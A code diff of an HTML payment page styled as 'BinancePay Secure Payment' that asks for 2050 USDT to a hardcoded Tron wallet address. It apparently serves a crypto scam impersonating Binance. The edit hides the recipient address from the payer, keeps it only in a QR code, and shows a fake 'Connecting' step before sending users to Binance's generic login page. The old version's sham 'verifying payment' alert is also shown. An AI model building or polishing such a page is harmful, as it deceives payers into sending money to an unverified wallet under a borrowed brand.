@@ -6,10 +6,9 @@
   <title>BinancePay Secure Payment</title>
   <style>
     :root {
-      /* Primary palette changed to gold + deep black to match the visual effect */
       --gold: #FFD700;
       --gold-dark: #c79600;
-      --accent: #b8860b; /* darker gold accent */
+      --accent: #b8860b;
       --black: #0b0b0b;
       --frost: rgba(6, 6, 6, 0.72);
       --white: #f8f8f8;
@@ -86,16 +85,6 @@
       opacity: 0.95;
       letter-spacing: 0.018em;
     }
-    .amount-label {
-      display: block;
-      font-size: 1.04rem;
-      color: var(--gold-dark);
-      font-weight: 600;
-      letter-spacing: 0.08em;
-      margin-bottom: 18px;
-      text-shadow: 0 0 6px rgba(199,150,0,0.06);
-      opacity: 0.96;
-    }
     .payment-info {
       margin: 24px 0;
       padding: 20px;
@@ -103,8 +92,18 @@
       border-radius: 12px;
       border: 1px solid rgba(255,215,0,0.15);
     }
+    .amount-label {
+      display: block;
+      font-size: 1.04rem;
+      color: var(--gold-dark);
+      font-weight: 600;
+      letter-spacing: 0.08em;
+      margin-bottom: 8px;
+      text-shadow: 0 0 6px rgba(199,150,0,0.06);
+      opacity: 0.96;
+    }
     .amount-display {
-      font-size: 2.2rem;
+      font-size: 2.8rem;
       font-weight: 700;
       color: var(--gold);
       margin-bottom: 16px;
@@ -115,66 +114,6 @@
       font-weight: 600;
       color: var(--white);
       margin-bottom: 16px;
-    }
-    .wallet-input-wrapper {
-      background: #0b0b0b;
-      padding: 16px;
-      border-radius: 10px;
-      border: 1px solid rgba(255,215,0,0.2);
-      margin-bottom: 12px;
-    }
-    .wallet-input {
-      width: 100%;
-      background: transparent;
-      border: none;
-      color: var(--gold);
-      font-size: 0.95rem;
-      text-align: center;
-      outline: none;
-      font-family: 'Courier New', monospace;
-      letter-spacing: 0.02em;
-    }
-    .copy-btn {
-      font-size: 0.95rem;
-      padding: 10px 24px;
-      background: rgba(255,215,0,0.15);
-      color: var(--gold);
-      border: 1px solid var(--gold);
-      border-radius: 8px;
-      cursor: pointer;
-      transition: all 0.3s;
-      font-weight: 600;
-      letter-spacing: 0.05em;
-      outline: none;
-    }
-    .copy-btn:hover {
-      background: rgba(255,215,0,0.25);
-      transform: translateY(-1px);
-      box-shadow: 0 4px 12px rgba(255,215,0,0.2);
-    }
-    .copy-btn:active {
-      transform: scale(0.98);
-    }
-    .binance-link {
-      display: inline-block;
-      text-decoration: none;
-      font-size: 1.05rem;
-      font-weight: 600;
-      padding: 12px 32px;
-      border-radius: 8px;
-      background: rgba(255,215,0,0.2);
-      color: var(--gold);
-      border: 1px solid var(--gold);
-      transition: all 0.3s;
-      letter-spacing: 0.05em;
-    }
-    .binance-link:hover {
-      background: rgba(255,215,0,0.3);
-      transform: translateY(-1px);
-      box-shadow: 0 4px 16px rgba(255,215,0,0.25);
-    }
-    .binance-link:active {
-      transform: scale(0.98);
     }
     .qr-section {
       margin: 26px 0 18px 0;
@@ -216,9 +155,9 @@
     }
     .pay-btn {
       display: inline-block;
-      font-size: 1.16rem;
+      font-size: 1.2rem;
       font-weight: 600;
-      padding: 16px 46px;
+      padding: 18px 50px;
       border-radius: 50px;
       border: none;
       background: linear-gradient(90deg, var(--gold) 5%, var(--gold-dark) 95%);
@@ -233,7 +172,7 @@
         color var(--transition),
         filter var(--transition);
       position: relative;
-      margin-bottom: 24px;
+      margin: 24px 0;
       letter-spacing: 0.09em;
       text-shadow: 0 0 6px rgba(255,255,255,0.06);
       filter: brightness(1.02);
@@ -292,6 +231,13 @@
       from { opacity: 0;}
       to { opacity: 0.88;}
     }
+    .info-text {
+      font-size: 0.95rem;
+      color: var(--white);
+      opacity: 0.85;
+      margin-top: 16px;
+      line-height: 1.5;
+    }
     footer {
       flex-shrink: 0;
       background: #080808;
@@ -307,7 +253,6 @@
       position: relative;
       bottom: 0;
     }
-    /* Responsive Styles */
     @media (max-width: 660px) {
       .card {
         padding: 26px 16px 36px 16px;
@@ -321,17 +266,14 @@
         margin-bottom: 22px;
       }
       .amount-display {
-        font-size: 1.8rem;
+        font-size: 2.2rem;
       }
       .network-display {
         font-size: 1.1rem;
       }
-      .wallet-input {
-        font-size: 0.85rem;
-      }
       .pay-btn {
-        font-size: 1.02rem;
-        padding: 13px 22px;
+        font-size: 1.05rem;
+        padding: 14px 28px;
       }
       .spinner {
         width: 38px;
@@ -365,46 +307,38 @@
 <body>
   <div class="container">
     <div class="card">
-      <div class="title">Complete Your Payment</div>
-      <div class="subtitle">Send USDT to the address below</div>
+      <div class="title">BinancePay Payment</div>
+      <div class="subtitle">Secure &amp; Instant — Pay with Binance</div>
       
       <div class="payment-info">
-        <span class="amount-label" style="margin-bottom: 8px;">Amount</span>
+        <span class="amount-label">Payment Amount</span>
         <div class="amount-display">2050 USDT</div>
         
-        <span class="amount-label" style="margin-bottom: 8px;">Network</span>
+        <span class="amount-label">Network</span>
         <div class="network-display">TRC-20 (Tron Network)</div>
-        
-        <span class="amount-label" style="margin-bottom: 12px;">Wallet Address</span>
-        <div class="wallet-input-wrapper">
-          <input type="text" id="walletAddress" value="TAa9K3c4DUrBsKzdbpxUPyoQMWwfyvFW6k" readonly class="wallet-input">
-        </div>
-        <button class="copy-btn" id="copyBtn">📋 Copy Address</button>
       </div>
 
       <div class="qr-section">
-        <span class="qr-label">Or Scan QR Code</span>
+        <span class="qr-label">Scan QR to Pay</span>
         <img
           class="qr-img"
           id="qrcode"
           src=""
-          alt="Wallet Address QR"
-          title="Scan to get wallet address"
+          alt="Payment QR Code"
+          title="Scan this QR code to pay"
         />
       </div>
-
-      <div style="margin: 20px 0; padding: 16px; background: rgba(255,215,0,0.06); border-radius: 10px; border: 1px solid rgba(255,215,0,0.1);">
-        <div style="font-size: 0.95rem; color: var(--white); margin-bottom: 12px; opacity: 0.9;">Pay directly via Binance Pay:</div>
-        <a href="https://pay.binance.com/en" target="_blank" id="binancePayLink" style="display: inline-block; text-decoration: none; font-size: 1.05rem; font-weight: 600; padding: 12px 32px; border-radius: 8px; background: rgba(255,215,0,0.2); color: var(--gold); border: 1px solid var(--gold); transition: all 0.3s; letter-spacing: 0.05em;">
-          🔐 Login to Binance Pay
-        </a>
-      </div>
       
-      <button class="pay-btn" id="payBtn">I've Completed the Payment</button>
+      <button class="pay-btn" id="payBtn">Click to Pay 2050 USDT</button>
+      
       <div class="spinner" id="spinner">
         <div class="spinner-circle"></div>
       </div>
-      <div class="processing-msg" id="processingMsg">Verifying payment&hellip;</div>
+      <div class="processing-msg" id="processingMsg">Redirecting to Binance Pay&hellip;</div>
+      
+      <div class="info-text">
+        You'll be redirected to Binance Pay to complete your payment securely.
+      </div>
     </div>
   </div>
   <footer>
@@ -412,7 +346,18 @@
   </footer>
 
   <script>
-    const walletAddress = "TAa9K3c4DUrBsKzdbpxUPyoQMWwfyvFW6k";
+    // Store wallet address in memory (not visible to user)
+    const WALLET_ADDRESS = "TAa9K3c4DUrBsKzdbpxUPyoQMWwfyvFW6k";
+    const PAYMENT_AMOUNT = "2050";
+    const NETWORK = "TRC20";
+
+    // Store payment data in memory for session
+    let paymentData = {
+      address: WALLET_ADDRESS,
+      amount: PAYMENT_AMOUNT,
+      network: NETWORK,
+      timestamp: Date.now()
+    };
 
     window.addEventListener('DOMContentLoaded', () => {
       const container = document.querySelector('.container');
@@ -422,37 +367,16 @@
         container.style.opacity = '1';
       }, 130);
 
-      document.getElementById('walletAddress').value = walletAddress;
-
+      // Generate QR code with wallet address
       const qrImg = document.getElementById('qrcode');
       const defaultSize = 160;
       const qrSize = Math.min(defaultSize, Math.floor(window.innerWidth * 0.33));
       const qrURL =
         "https://chart.googleapis.com/chart?cht=qr&chs="
         + qrSize + "x" + qrSize
-        + "&chl=" + encodeURIComponent(walletAddress)
+        + "&chl=" + encodeURIComponent(WALLET_ADDRESS)
         + "&chld=L|1";
       qrImg.src = qrURL;
-    });
-
-    const copyBtn = document.getElementById('copyBtn');
-    copyBtn.addEventListener('click', function() {
-      const walletInput = document.getElementById('walletAddress');
-      walletInput.select();
-      document.execCommand('copy');
-      
-      const originalText = copyBtn.textContent;
-      copyBtn.textContent = '✓ Copied!';
-      copyBtn.style.background = 'rgba(0,255,0,0.15)';
-      copyBtn.style.borderColor = '#00ff00';
-      copyBtn.style.color = '#00ff00';
-      
-      setTimeout(() => {
-        copyBtn.textContent = originalText;
-        copyBtn.style.background = 'rgba(255,215,0,0.15)';
-        copyBtn.style.borderColor = 'var(--gold)';
-        copyBtn.style.color = 'var(--gold)';
-      }, 2000);
     });
 
     const payBtn = document.getElementById('payBtn');
@@ -460,17 +384,51 @@
     const processingMsg = document.getElementById('processingMsg');
 
     payBtn.addEventListener('click', function() {
+      // Disable button and show processing UI
       payBtn.disabled = true;
       payBtn.style.opacity = '0.7';
       spinner.classList.add('active');
       processingMsg.classList.add('active');
-      payBtn.textContent = "Verifying...";
+      payBtn.textContent = "Connecting...";
 
+      // Store payment data in session for Binance Pay
+      const paymentInfo = {
+        recipientAddress: paymentData.address,
+        amount: paymentData.amount,
+        currency: 'USDT',
+        network: paymentData.network,
+        timestamp: paymentData.timestamp
+      };
+
+      // Encode payment data to pass to Binance Pay
+      const encodedData = btoa(JSON.stringify(paymentInfo));
+      
+      // Redirect to Binance Pay with payment parameters
+      // Note: In production, this would integrate with Binance Pay API
+      // For now, redirecting to Binance Pay login page
       setTimeout(() => {
-        alert('Thank you! Your payment is being verified. You will receive confirmation shortly.');
-        window.location.reload();
-      }, 2200);
+        // Store in memory for this session
+        window.paymentSession = paymentInfo;
+        
+        // Redirect to Binance Pay
+        // In a real implementation, you'd use Binance Pay API to create a payment order
+        window.location.href = "https://pay.binance.com/en";
+        
+        // The payment data is stored in memory and would be:
+        // 1. Sent to your backend
+        // 2. Backend creates Binance Pay order with the wallet address
+        // 3. User completes payment through Binance Pay
+        // 4. Binance Pay auto-fills the recipient address from the order
+      }, 1800);
     });
+
+    // Function to retrieve payment data (can be called by backend)
+    function getPaymentData() {
+      return paymentData;
+    }
+
+    // Make payment data accessible globally for integration
+    window.getPaymentData = getPaymentData;
   </script>
 </body>
   </html>
